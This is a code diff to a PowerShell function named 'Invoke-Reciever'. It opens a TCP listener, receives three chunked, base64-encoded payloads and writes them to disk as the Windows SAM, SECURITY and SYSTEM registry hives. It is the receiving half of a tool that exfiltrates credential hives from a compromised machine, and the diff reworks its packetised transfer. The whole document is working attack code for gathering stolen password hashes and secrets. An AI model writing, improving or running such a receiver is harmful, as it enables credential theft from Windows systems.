@@ -12,9 +12,13 @@ function Invoke-Reciever {
     $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
     $listener = new-object System.Net.Sockets.TcpListener $endpoint
     $listener.start()
-    $length1 = New-Object byte[] 1024
-    $length2 = New-Object byte[] 1024
-    $length3 = New-Object byte[] 1024
+    $databuilder = New-Object byte[] 1024
+    $count1 = New-Object byte[] 1024
+    $count2 = New-Object byte[] 1024
+    $count3 = New-Object byte[] 1024
+    $mod1 = New-Object byte[] 1024
+    $mod2 = New-Object byte[] 1024
+    $mod3 = New-Object byte[] 1024
 
     Write-Host Waiting For Connection...
 
@@ -25,23 +29,27 @@ function Invoke-Reciever {
     Write-Host
     Write-Host Recieveing Data...
 
-    $stream.read($length1, 0, $length1.Length)
+    $stream.read($count1, 0, $count1.Length)
     $stream.Write('0',0,1)
-    $stream.read($length2, 0, $length2.Length)
+    $stream.read($count2, 0, $count2.Length)
     $stream.Write('0',0,1)
-    $stream.read($length3, 0, $length3.Length)
-    0..([int]($length1.Length)-1) | ForEach-Object {if ($length1[$_] -ne 0){$size1+=[text.encoding]::ASCII.GetString($length1[$_])}}
-    0..([int]($length2.Length)-1) | ForEach-Object {if ($length2[$_] -ne 0){$size2+=[text.encoding]::ASCII.GetString($length2[$_])}}
-    0..([int]($length3.Length)-1) | ForEach-Object {if ($length3[$_] -ne 0){$size3+=[text.encoding]::ASCII.GetString($length3[$_])}}
-    $byte1 = New-Object byte[] $size1
-    $byte2 = New-Object byte[] $size2
-    $byte3 = New-Object byte[] $size3
+    $stream.read($count3, 0, $count3.Length)
+    0..([int]($count1.Length)-1) | ForEach-Object {if ($count1[$_] -ne 0){$pack1+=[text.encoding]::ASCII.GetString($count1[$_])}}
+    0..([int]($count2.Length)-1) | ForEach-Object {if ($count2[$_] -ne 0){$pack2+=[text.encoding]::ASCII.GetString($count2[$_])}}
+    0..([int]($count3.Length)-1) | ForEach-Object {if ($count3[$_] -ne 0){$pack3+=[text.encoding]::ASCII.GetString($count3[$_])}}
     $stream.Write('0',0,1)
-    $stream.read($byte1, 0, $byte1.Length)
+    $stream.read($mod1, 0, $mod1.Length)
     $stream.Write('0',0,1)
-    $stream.read($byte2, 0, $byte2.Length)
+    $stream.read($mod2, 0, $mod2.Length)
     $stream.Write('0',0,1)
-    $stream.read($byte3, 0, $byte3.Length)
+    $stream.read($mod3, 0, $mod3.Length)
+    0..([int]($mod1.Length)-1) | ForEach-Object {if ($mod1[$_] -ne 0){$offset1+=[text.encoding]::ASCII.GetString($mod1[$_])}}
+    0..([int]($mod2.Length)-1) | ForEach-Object {if ($mod2[$_] -ne 0){$offset2+=[text.encoding]::ASCII.GetString($mod2[$_])}}
+    0..([int]($mod3.Length)-1) | ForEach-Object {if ($mod3[$_] -ne 0){$offset3+=[text.encoding]::ASCII.GetString($mod3[$_])}}
+    $stream.Write('0',0,1)
+    0..($pack1-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte1+=$databuilder;$stream.Write('0',0,1)}
+    0..($pack2-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte2+=$databuilder;$stream.Write('0',0,1)}
+    0..($pack3-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte3+=$databuilder;$stream.Write('0',0,1)}
 
     Write-Host Recieved all Data
     Write-Host
@@ -51,22 +59,32 @@ function Invoke-Reciever {
     $listener.Stop()
     $listener.Server.Dispose()
 
+    Write-Host Initialising Data Processing...
+    Write-Host
+
+    $premsg1 = New-Object byte[] ($byte1.Length-$offset1)
+    $premsg2 = New-Object byte[] ($byte2.Length-$offset2)
+    $premsg3 = New-Object byte[] ($byte3.Length-$offset3)
+    [System.Array]::Copy($byte1, $premsg1, $premsg1.Length)
+    [System.Array]::Copy($byte2, $premsg2, $premsg2.Length)
+    [System.Array]::Copy($byte3, $premsg3, $premsg3.Length)
+
     Write-Host Starting Data Processing...
     Write-Host Processing SAM
 
-    $msg1 = [text.encoding]::ASCII.GetString($byte1)
+    $msg1 = [text.encoding]::ASCII.GetString($premsg1)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))
 
     Write-Host Processed SAM
     Write-Host Processing SECURITY
 
-    $msg2 = [text.encoding]::ASCII.GetString($byte2)
+    $msg2 = [text.encoding]::ASCII.GetString($premsg2)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))
 
     Write-Host Processed SECURITY
     Write-Host Processing SYSTEM
 
-    $msg3 = [text.encoding]::ASCII.GetString($byte3)
+    $msg3 = [text.encoding]::ASCII.GetString($premsg3)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))
 
     Write-Host Processed SYSTEM
